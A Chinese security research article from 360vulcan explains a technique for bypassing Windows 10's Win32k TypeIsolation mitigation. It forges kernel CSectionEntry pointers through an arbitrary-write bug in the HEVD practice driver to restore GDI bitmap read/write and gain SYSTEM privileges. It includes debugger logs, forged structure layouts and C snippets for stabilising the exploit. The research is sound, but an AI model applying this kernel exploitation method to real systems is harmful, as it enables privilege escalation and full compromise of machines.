# Save and Reborn GDI data-only attack from Win32k TypeIsolation

阅读量 **165236**

|评论 **1**

发布时间 : 2018-05-07 17:12:02

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t0158bb54fdeb3f9812.jpg)

作者：k0shl from 360vulcan team

作者twitter：[@KeyZ3r0](https://twitter.com/KeyZ3r0)

作者微博：[@我叫0day谁找我_](https://weibo.com/p/1005055342666404)

## 一、背景

近年来，在内核漏洞利用中利用GDI object来完成任意地址R/W的方法越来越成熟，在池溢出（pool overflow），任意地址写（arbitrary
write），越界写（oob write），释放后重用（uaf），二次释放（double free）等很多漏洞类型的场景中，都可以利用GDI
object来完成任意地址读写，我们称为GDI data-only attack。

微软在Windows 10 build 1709版本之后引入了win32k类型隔离用来缓解GDI
object这种利用方式，我在对win32kbase.sys关于typeisolation实现的逆向工程中发现了微软在设计类型隔离这种缓解措施时的一处失误，导致在某些常见漏洞场景中仍然可以利用GDI
object完成data-only exploitation，在本文中，我将与大家分享这个新的攻击方案思路。

**调试环境：**

**OS:**

Windows 10 rs3 16299.371

**FILE:**

Win32kbase.sys 10.0.16299.371

## 二、GDI data-only attack

GDI data-only attack是当前内核漏洞利用中比较常见的利用手段之一，利用常见的漏洞场景修改GDI
object的某些特定成员变量，就可以使用win32k中管理GDI的API完成任意地址读写。目前，在GDI data-only
attack中常用的两个GDI object是Bitmap以及Palette，关于Bitmap一个重要的结构是

    
    
    typedef struct _SURFOBJ {
    
    DHSURF dhsurf;
    
    HSURF  hsurf;
    
    DHPDEV dhpdev;
    
    HDEV   hdev;
    
    SIZEL  sizlBitmap;
    
    ULONG  cjBits;
    
    PVOID  pvBits;
    
    PVOID  pvScan0;
    
    LONG   lDelta;
    
    ULONG  iUniq;
    
    ULONG  iBitmapFormat;
    
    USHORT iType;
    
    USHORT fjBitmap;
    
    } SURFOBJ, *PSURFOBJ;
    
    

Palette一个重要的结构是：

    
    
    typedef struct _PALETTE64
    
    {
    
    BASEOBJECT64      BaseObject;
    
    FLONG           flPal;
    
    ULONG32           cEntries;
    
    ULONG32           ulTime;
    
    HDC             hdcHead;
    
    ULONG64        hSelected;
    
    ULONG64           cRefhpal;
    
    ULONG64          cRefRegular;
    
    ULONG64      ptransFore;
    
    ULONG64      ptransCurrent;
    
    ULONG64      ptransOld;
    
    ULONG32           unk_038;
    
    ULONG64         pfnGetNearest;
    
    ULONG64   pfnGetMatch;
    
    ULONG64           ulRGBTime;
    
    ULONG64       pRGBXlate;
    
    PALETTEENTRY    *pFirstColor;
    
    struct _PALETTE *ppalThis;
    
    PALETTEENTRY    apalColors[3];
    
    }
    
    

在Bitmap和Palette的内核结构中，和GDI data-only
attack相关的两个重要成员变量是Bitmap->pvScan0和Palette->pFirstColor。这两个成员变量指向Bitmap和Palette的data域，可以通过GDI
API向data域读取或写入数据，只要我们通过触发漏洞修改这两个成员变量指向任意内存地址，就可以通过GetBitmapBits/SetBitmapBits或GetPaletteEntries/SetPaletteEntries完成对指向任意内存地址写入和读取，也就是任意地址读写。

关于利用Bitmap和Palette来完成GDI data-only
attack现在网上已经有很多相关的技术文章，同时也不是本文的讨论重点，这里就不做更深入的分享，相关的资料可以参考第五部分。

## 三、Win32k TypeIsolation

GDI data-only attack这种利用方式大大降低了内核利用的难度，且在大多数常见漏洞类型的场景中都可以应用，微软在Windows10 rs3
build 1709之后增加了一个新的缓解机制—-win32k typeisolation，通过一个双向链表将GDI object统一管理起来，同时将GDI
object的头部与data域分离，这样不仅仅缓解了利用pool fengshui制造可预测池再使用GDI
object进行占位并修改关键成员变量这种利用技术，同时也缓解了通过修改头部其他成员变量来增大data域可控范围这种利用技术，因为头部与data域部分不再相邻。

关于win32k typeisolation的机制可参考下图：

![](https://p3.ssl.qhimg.com/t01c410cea0ae98a8a5.png)

在这里我对win32k typeisolation的机制关键部分进行简要说明，关于win32k typeisolation的详细运行机制，包括GDI
object的申请，分配，释放等可参考第五部分。

在win32k typeisolation中，GDI
object通过CSectionEntry这个双向链表进行统一管理，其中view域指向一个0x28000大小的内存空间，而GDI
object的头部在这里统一被管理，view域以view数组的方式管理，数组大小是0x1000。而在对GDI
object的分配时RTL_BITMAP会作为是否向指定view域位置分配GDI object的重要依据。

在CSectionEntry中，bitmap_allocator指向CSectionBitmapAllocator，在CSectionBitmapAllocator中存放的xored_view，xor_key，xored_rtl_bitmap，其中xored_view
^ xor_key指向view域，xored_rtl_btimap ^ xor_key指向RTL_BITMAP。

在RTL_BITMAP中bitmap_buffer_ptr指向的BitmapBuffer用于记录view域的状态，空闲为0，占位为1。当申请GDI
object的时候，会通过win32kbase!gpTypeIsolation开始遍历CSectionEntry列表，通过对CSectionBitmapAllocator查看是否当前view域包含空闲位置，如果存在空闲位则会将新的GDI
object header放置在view域中。

我对CTypeIsolation类和CSectionEntry类关于对GDI
object申请和释放实现的逆向中发现，TypeIsolation在对CSectionEntry双向链表遍历，利用CSectionBitmapAllocator判断view域状态，并对view域中存放的GDI
object
SURFACE进行管理的过程中，并没有检查CSectionEntry->view和CSectionEntry->bitmap_allocator指针指向的有效性，也就是说如果我们能够构造一个fake
view和fake
bitmap_allocator并能够利用漏洞修改CSectionEntry->view和CSectionEntry->bitmap_allocator使其指向fake
struct，则我们可以重新利用GDI object完成data-only attack。

## 四、Save and reborn gdi data-only attack！

在本节中我来和大家分享一下这种攻击方案的利用思路，HEVD是Hacksysteam开发的一个存在典型内核漏洞的练习驱动，在HEVD中存在一个任意地址（Arbitrary
Write）漏洞，我们就以这个漏洞为例来和大家分享整个利用过程。

**Attack scenario：**

首先来看一下CSectionEntry的申请，CSectionEntry会申请0x40大小的session paged
pool，CSectionEntry申请池空间的实现在NSInstrumentation::CSectionEntry::Create()中。

    
    
    .text:00000001C002AC8A                 mov     edx, 20h        ; NumberOfBytes
    
    .text:00000001C002AC8F                 mov     r8d, 6F736955h  ; Tag
    
    .text:00000001C002AC95                 lea     ecx, [rdx+1]    ; PoolType
    
    .text:00000001C002AC98                 call    cs:__imp_ExAllocatePoolWithTag //Allocate 0x40 session paged pool
    
    

也就是说，我们仍然可以通过pool fengshui来制造一个可预测的session paged pool
hole用来给CSectionEntry占位，因此在HEVD这个Arbitrary
write的漏洞利用场景中，我们使用tagWND的方法制造一个稳定的pool
hole，并且利用[HMValidateHandle](https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp)泄露tagWND内核对象地址。因为当前漏洞实例是一个任意地址写漏洞，因此如果我们能泄露内核对象地址便于我们对这个攻击方案思路的理解，当然在很多攻击场景中只需要利用pool
fengshui制造一个可预测池即可。

    
    
    kd> g//利用tagWND制造一个稳定的pool hole
    
    Break instruction exception - code 80000003 (first chance)
    
    0033:00007ff6`89a61829 cc              int     3
    
    kd> p
    
    0033:00007ff6`89a6182a 488b842410010000 mov     rax,qword ptr [rsp+110h]
    
    kd> p
    
    0033:00007ff6`89a61832 4839842400010000 cmp     qword ptr [rsp+100h],rax
    
    kd> r rax
    
    rax=ffff862e827ca220
    
    kd> !pool ffff862e827ca220
    
    Pool page ffff862e827ca220 region is Unknown
    
    ffff862e827ca000 size:  150 previous size:    0  (Allocated)  Gh04
    
    ffff862e827ca150 size:   10 previous size:  150  (Free)       Free
    
    ffff862e827ca160 size:   b0 previous size:   10  (Free )  Uscu
    
    *ffff862e827ca210 size:   40 previous size:   b0  (Allocated) *Ustx Process: ffffd40acb28c580
    
    Pooltag Ustx : USERTAG_TEXT, Binary : win32k!NtUserDrawCaptionTemp
    
    ffff862e827ca250 size:   e0 previous size:   40  (Allocated)  Gla8
    
    ffff862e827ca330 size:   e0 previous size:   e0  (Allocated)  Gla8```
    
    

在0xffff862e827ca220制造了一个稳定的session paged pool
hole，0xffff862e827ca220会在之后释放，处于free状态。

    
    
    kd> p
    
    0033:00007ff7`abc21787 488b842498000000 mov     rax,qword ptr [rsp+98h]
    
    kd> p
    
    0033:00007ff7`abc2178f 48398424a0000000 cmp     qword ptr [rsp+0A0h],rax
    
    kd> !pool ffff862e827ca220
    
    Pool page ffff862e827ca220 region is Unknown
    
    ffff862e827ca000 size:  150 previous size:    0  (Allocated)  Gh04
    
    ffff862e827ca150 size:   10 previous size:  150  (Free)       Free
    
    ffff862e827ca160 size:   b0 previous size:   10  (Free )  Uscu
    
    *ffff862e827ca210 size:   40 previous size:   b0  (Free ) *Ustx
    
    Pooltag Ustx : USERTAG_TEXT, Binary : win32k!NtUserDrawCaptionTemp
    
    ffff862e827ca250 size:   e0 previous size:   40  (Allocated)  Gla8
    
    ffff862e827ca330 size:   e0 previous size:   e0  (Allocated)  Gla8
    
    

下面我们需要令CSecitionEntry在0xffff862e827ca220位置占位，这就需要利用TypeIsolation的一个特性，正如第二节我们提到的，在GDI
object对象申请时，会遍历CSectionEntry，并通过CSectionBitmapAllocator判断view域中是否有空闲位，如果CSectionEntry的view域已满，则会到下一个CSectionEntry中继续查询，但如果当前的CTypeIsolation双向链表中，所有的CSectionEntry的view域全都被占满，则会调用NSInstrumentation::CSectionEntry::Create()创建一个新的CSectionEntry。

因此，我们在制造完pool hole之后申请大量的GDI
object，用来占满所有CSectionEntry的view域，以确保创建新的CSectionEntry，并且占用0x40大小的pool hole。

    
    
    kd> g//创建大量的GDI object， 0xffff862e827ca220位置被CSectionEntry占位
    
    kd> !pool ffff862e827ca220
    
    Pool page ffff862e827ca220 region is Unknown
    
    ffff862e827ca000 size:  150 previous size:    0  (Allocated)  Gh04
    
    ffff862e827ca150 size:   10 previous size:  150  (Free)       Free
    
    ffff862e827ca160 size:   b0 previous size:   10  (Free )  Uscu
    
    *ffff862e827ca210 size:   40 previous size:   b0  (Allocated) *Uiso
    
    Pooltag Uiso : USERTAG_ISOHEAP, Binary : win32k!TypeIsolation::Create
    
    ffff862e827ca250 size:   e0 previous size:   40  (Allocated)  Gla8 ffff86b442563150 size:
    
    

接下来我们需要构造fake CSectionEntry->view和fake
CSectionEntry->bitmap_allocator，并且利用Arbitrary Write修改session paged pool
hole中的CSectionEntry中的指针，使其指向我们构造的fake struct。

在我们申请大量GDI object的时候建立的新的CSectionEntry的view域中可能已经被SURFACE占满或占据了一部分，如果我们构造fake
struct的时候将view域构造成空，那么就可以欺骗TypeIsolation，在GDI object申请的时候会将SURFACE放在已知位置。

我们通过VirtualAllocEx在userspace申请内存存放fake struct，并且我们将userspace
memory属性置成READWRITE。

    
    
    kd> dq 1e0000//fake pushlock
    
    00000000`001e0000  00000000`00000000 00000000`0000006c
    
    kd> dq 1f0000//fake view
    
    00000000`001f0000  00000000`00000000 00000000`00000000
    
    00000000`001f0010  00000000`00000000 00000000`00000000
    
    kd> dq 190000//fake RTL_BITMAP
    
    00000000`00190000  00000000`000000f0 00000000`00190010
    
    00000000`00190010  00000000`00000000 00000000`00000000
    
    kd> dq 1c0000//fake CSectionBitmapAllocator
    
    00000000`001c0000  00000000`001e0000 deadbeef`deb2b33f
    
    00000000`001c0010  deadbeef`deadb33f deadbeef`deb4b33f
    
    00000000`001c0020  00000001`00000001 00000001`00000000
    
    

其中，0x1f0000指向view域，0x1c0000指向CSectionBitmapAllocator，fake view域将用于存放GDI
object，而CSectionBitmapAllocator中的结构需要精心构造，因为我们需要通过它来欺骗typeisolation认为我们可控的CSectionEntry是个空闲view项。

    
    
    typedef struct _CSECTIONBITMAPALLOCATOR {
    
    PVOID           pushlock;           // + 0x00
    
    ULONG64         xored_view;         // + 0x08
    
    ULONG64         xor_key;            // + 0x10
    
    ULONG64         xored_rtl_bitmap;   // + 0x18
    
    ULONG           bitmap_hint_index;  // + 0x20
    
    ULONG           num_commited_views; // + 0x24
    
    } CSECTIONBITMAPALLOCATOR, *PCSECTIONBITMAPALLOCATOR;
    
    

上述CSectionBitmapAllocator结构和0x1c0000处的结构对照，其中xor_key我定义为0xdeadbeefdeadb33f，只要保证xor_key
^ xor_view和xor_key ^
xor_rtl_bitmap运算之后指向view域和RTL_BITMAP即可，在调试的过程中我发现pushlock必须是指向有效结构的指针，否则会触发BUGCHECK，因此我申请了0x1e0000用于存放pushlock的内容。

如第二节所述，bitmap_hint_index会作为快速查找RTL_BITMAP的条件，因此这个值也需要置为空值表示RTL_BITMAP的状态。同理我们来看一下RTL_BITMAP的结构。

    
    
    typedef struct _RTL_BITMAP {
    
    ULONG64         size;               // + 0x00
    
    PVOID           bitmap_buffer;      // + 0x08
    
    } RTL_BITMAP, *PRTL_BITMAP;
    
    kd> dyb fffff322401b90b0
    
    76543210 76543210 76543210 76543210
    
    -------- -------- -------- --------    
    fffff322`401b90b0  11110000 00000000 00000000 00000000  f0 00 00 00
    
    fffff322`401b90b4  00000000 00000000 00000000 00000000  00 00 00 00
    
    fffff322`401b90b8  11000000 10010000 00011011 01000000  c0 90 1b 40
    
    fffff322`401b90bc  00100010 11110011 11111111 11111111  22 f3 ff ff
    
    fffff322`401b90c0  11111111 11111111 11111111 11111111  ff ff ff ff
    
    fffff322`401b90c4  11111111 11111111 11111111 11111111  ff ff ff ff
    
    fffff322`401b90c8  11111111 11111111 11111111 11111111  ff ff ff ff
    
    fffff322`401b90cc  11111111 11111111 11111111 11111111  ff ff ff ff
    
    kd> dq fffff322401b90b0
    
    fffff322`401b90b0  00000000`000000f0 fffff322`401b90c0//ptr to rtl_bitmap buffer
    
    fffff322`401b90c0  ffffffff`ffffffff ffffffff`ffffffff
    
    fffff322`401b90d0  ffffffff`ffffffff
    
    

这里我选取了一个有效的RTL_BITMAP作为模板，其中第一个成员变量表示RTL_BITMAP
size，第二个成员变量指向后面的bitmap_buffer，而紧邻的bitmap_buffer以比特为单位表示view域状态，我们为了欺骗typeisolation，将其全部置0，表示当前CSectionEntry项的view域全部空闲，参考0x190000
fake RTL_BITMAP结构。

接下来我们只需要通过HEVD的Arbitrary
write漏洞修改CSectionEntry中view和CSectionBitmapAllocator指针即可。

    
    
    kd> dq ffff862e827ca220//正常时
    
    ffff862e`827ca220  ffff862e`827cf4f0 ffff862e`827ef300
    
    ffff862e`827ca230  ffffc383`08613880 ffff862e`84780000
    
    ffff862e`827ca240  ffff862e`827f33c0 00000000`00000000
    
    kd> g//触发漏洞后，CSectionEntry-&gt;view和CSectionEntry-&gt;bitmap_allocator被修改
    
    Break instruction exception - code 80000003 (first chance)
    
    0033:00007ff7`abc21e35 cc              int     3
    
    kd> dq ffff862e827ca220
    
    ffff862e`827ca220  ffff862e`827cf4f0 ffff862e`827ef300
    
    ffff862e`827ca230  ffffc383`08613880 00000000`001f0000
    
    ffff862e`827ca240  00000000`001c0000 00000000`00000000
    
    

接下来我们正常申请一个GDI object，调用CreateBitmap创建一个bitmap object，然后观察view域的状态。

    
    
    kd> g
    
    Break instruction exception - code 80000003 (first chance)
    
    0033:00007ff7`abc21ec8 cc              int     3
    
    kd> dq 1f0280
    
    00000000`001f0280  00000000`00051a2e 00000000`00000000
    
    00000000`001f0290  ffffd40a`cc9fd700 00000000`00000000
    
    00000000`001f02a0  00000000`00051a2e 00000000`00000000
    
    00000000`001f02b0  00000000`00000000 00000002`00000040
    
    00000000`001f02c0  00000000`00000080 ffff862e`8277da30
    
    00000000`001f02d0  ffff862e`8277da30 00003f02`00000040
    
    00000000`001f02e0  00010000`00000003 00000000`00000000
    
    00000000`001f02f0  00000000`04800200 00000000`00000000
    
    

可以看到bitmap的kernel object被放置在了fake view域中，我们可以直接从userspace读到bitmap的kernel
object，接下来，我们只需要直接通过修改userspace中存放的bitmap kernel
object的pvScan0，再通过GetBitmapBits/SetBitmapBits来完成任意地址读写。

总结一下整个利用过程：

![](https://p5.ssl.qhimg.com/t019b712207407459de.png)

**Fix for full exploit：**

在完成exploit的过程中，我发现了某些时候会产生BSOD，这大大降低了GDI data-only attack的稳定性，比如说

    
    
    kd> !analyze -v
    
    *******************************************************************************
    
    *                                                                             *
    
    *                        Bugcheck Analysis                                    *
    
    *                                                                             *
    
    *******************************************************************************
    
    
    
    
    SYSTEM_SERVICE_EXCEPTION (3b)
    
    An exception happened while executing a system service routine.
    
    Arguments:
    
    Arg1: 00000000c0000005, Exception code that caused the bugcheck
    
    Arg2: ffffd7d895bd9847, Address of the instruction which caused the bugcheck
    
    Arg3: ffff8c8f89e98cf0, Address of the context record for the exception that caused the bugcheck
    
    Arg4: 0000000000000000, zero.
    
    
    
    Debugging Details:
    
    ------------------    
    
    
    
    
    
    
    OVERLAPPED_MODULE: Address regions for 'dxgmms1' and 'dump_storport.sys' overlap
    
    
    
    
    EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - 0x%08lx
    
    
    
    
    FAULTING_IP:
    
    win32kbase!NSInstrumentation::CTypeIsolation<163840,640>::AllocateType+47
    
    ffffd7d8`95bd9847 488b1e          mov     rbx,qword ptr [rsi]
    
    
    
    
    CONTEXT:  ffff8c8f89e98cf0 -- (.cxr 0xffff8c8f89e98cf0)
    
    .cxr 0xffff8c8f89e98cf0
    
    rax=ffffdb0039e7c080 rbx=ffffd7a7424e4e00 rcx=ffffdb0039e7c080
    
    rdx=ffffd7a7424e4e00 rsi=00000000001e0000 rdi=ffffd7a740000660
    
    rip=ffffd7d895bd9847 rsp=ffff8c8f89e996e0 rbp=0000000000000000
    
    r8=ffff8c8f89e996b8  r9=0000000000000001 r10=7ffffffffffffffc
    
    r11=0000000000000027 r12=00000000000000ea r13=ffffd7a740000680
    
    r14=ffffd7a7424dca70 r15=0000000000000027
    
    iopl=0         nv up ei pl nz na po nc
    
    cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
    
    win32kbase!NSInstrumentation::CTypeIsolation<163840,640>::AllocateType+0x47:
    
    ffffd7d8`95bd9847 488b1e          mov     rbx,qword ptr [rsi] ds:002b:00000000`001e0000=????????????????
    
    

经过多次跟踪后我发现，BSOD产生的原因主要是我们通过VirtualAllocEx时申请的fake
struct位于我们当前进程的进程空间，这个空间不被其他进程共享，也就是说，如果我们通过漏洞修改了view域和CSectionBitmapAllocator的指针之后，当其他进程申请GDI
object时，同样会遍历CSecitionEntry，当遍历到我们通过漏洞修改的CSectionEntry时，会因为指向进程地址空间无效，产生BSoD，所以这里当触发漏洞之后我做了第一次fix。

    
    
    DWORD64 fix_bitmapbits1 = 0xffffffffffffffff;
    
    DWORD64 fix_bitmapbits2 = 0xffffffffffff;
    
    DWORD64 fix_number = 0x2800000000;
    
    CopyMemory((void *)(fakertl_bitmap + 0x10), &fix_bitmapbits1, 0x8);
    
    CopyMemory((void *)(fakertl_bitmap + 0x18), &fix_bitmapbits1, 0x8);
    
    CopyMemory((void *)(fakertl_bitmap + 0x20), &fix_bitmapbits1, 0x8);
    
    CopyMemory((void *)(fakertl_bitmap + 0x28), &fix_bitmapbits2, 0x8);
    
    CopyMemory((void *)(fakeallocator + 0x20), &fix_number, 0x8);
    
    

在第一个fix中，我修改了bitmap_hint_index和rtl_bitmap，欺骗typeisolation在遍历CSectionEntry的时候认为fake
CSectionEntry的view域目前已被占满，就会直接跳过这个CSectionEntry。

我们知道当前的CSectionEntry已经被我们修改，因此即使我们结束了exploit退出进程后CSectionEntry仍然会作为CTypeIsolation双向链表的一部分，而我们进程退出时，VirtualAllocEx申请的当前进程用户空间会被释放掉，这就会引发很多未知的错误，而我们已经通过漏洞拥有了任意地址读写的能力，于是我进行了第二次fix。

    
    
    ArbitraryRead(bitmap, fakeview + 0x280 + 0x48, CSectionEntryKernelAddress + 0x8, (BYTE *)&amp;CSectionPrevious, sizeof(DWORD64));
    
    ArbitraryRead(bitmap, fakeview + 0x280 + 0x48, CSectionEntryKernelAddress, (BYTE *)&amp;CSectionNext, sizeof(DWORD64));
    
    LogMessage(L_INFO, L"Current CSectionEntry-&gt;previous: 0x%p", CSectionPrevious);
    
    LogMessage(L_INFO, L"Current CSectionEntry-&gt;next: 0x%p", CSectionNext);
    
    ArbitraryWrite(bitmap, fakeview + 0x280 + 0x48, CSectionNext + 0x8, (BYTE *)&amp;CSectionPrevious, sizeof(DWORD64));
    
    ArbitraryWrite(bitmap, fakeview + 0x280 + 0x48, CSectionPrevious, (BYTE *)&amp;CSectionNext, sizeof(DWORD64));
    
    

第二次fix中，我获取了CSectionEntry->previous和CSectionEntry->next，将当前CSectionEntry脱链(unlink)，这样在GDI
object分配遍历CSectionEntry时，就不会再对fake CSectionEntry处理。

当完成这两个fix之后，就可以成功利用GDI data-only attack完成任意地址读写了，这里我直接获取到了最新版Windows10
rs3的SYSTEM权限，但是在进程完全退出的时候却再一次引发了BSoD。经过分析发现，这个BSoD是由于进行了unlink之后，由于GDI的句柄保存在GDI
handle table中，这时会去CSectionEntry中找到对应内核对象并free掉，而我们存放bitmap kernel
object的CSectionEntry已经被unlink，引发了BSoD的发生。

问题发生在NtGdiCloseProcess中，该函数负责释放当前进程的GDI object，跟SURFACE相关的调用链如下

    
    
    0e ffff858c`8ef77300 ffff842e`52a57244 win32kbase!SURFACE::bDeleteSurface+0x7ef
    
    0f ffff858c`8ef774d0 ffff842e`52a1303f win32kbase!SURFREF::bDeleteSurface+0x14
    
    10 ffff858c`8ef77500 ffff842e`52a0cbef win32kbase!vCleanupSurfaces+0x87
    
    11 ffff858c`8ef77530 ffff842e`52a0c804 win32kbase!NtGdiCloseProcess+0x11f
    
    

bDeleteSurface负责释放Gdi handle table中的SURFACE内核对象，我们需要在GDI handle
table中找到存放在fake
view中的HBITMAP，并且将其置0，这样就会在bDeleteSurface中不进行后续的free处理，直接跳过再调用HmgNextOwned释放下一个GDI
object。关于查找HBITMAP在GDI handle table中的位置的关键代码在HmgSharedLockCheck中，其关键代码如下：

    
    
    v4 = *(_QWORD *)(*(_QWORD *)(**(_QWORD **)(v10 + 24) + 8 * ((unsigned __int64)(unsigned int)v6 >> 8)) + 16i64 * (unsigned __int8)v6 + 8);
    
    

这里我还原了一个完整的查找bitmap对象的计算方法：

    
    
    *(*(*(*(*win32kbase!gpHandleManager+10)+8)+18)+(hbitmap&0xffff>>8)*8)+hbitmap&0xff*2*8
    
    

值得一提的是这里需要泄露win32kbase.sys的基址，在Low IL的情况下需要漏洞来leak info，我是通过在Medium
IL下用NtQuerySystemInformation泄露win32kbase.sys基址从而计算出gpHandleManager的地址，之后找到fake
view中bitmap在Gdi handle table中的对象位置，并置0，最后完成了full exploit。

![](https://p1.ssl.qhimg.com/t0106bd9731c1a24760.png)

现在内核利用越来越难，一个漏洞往往需要其他漏洞的支持，比如info leak。而相比越界写，uaf，double free和write-what-where这几种漏洞，pool
overflow在使用这种方案利用上更为复杂，因为涉及到CSectionEntry->previous和CSectionEntry->next的问题，但并不是不可能在pool
overflow中使用这种方法。

作者水平有限，如果有问题欢迎交流讨论，谢谢！

## 五、参考

<https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives>

<https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/5A1F/DEFCON-25-5A1F-Demystifying-Kernel-Exploitation-By-Abusing-GDI-Objects.pdf>

<https://blog.quarkslab.com/reverse-engineering-the-win32k-type-isolation-mitigation.html>

<https://github.com/sam-b/windows_kernel_address_leaks>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **360vulcan team** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/107532](/post/id/107532)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞利用](/tag/漏洞利用)
  * [内核漏洞](/tag/内核漏洞)
  * [技术分析](/tag/技术分析)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhimg.com/t01cce7f410770758df.png) 360vulcan team

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

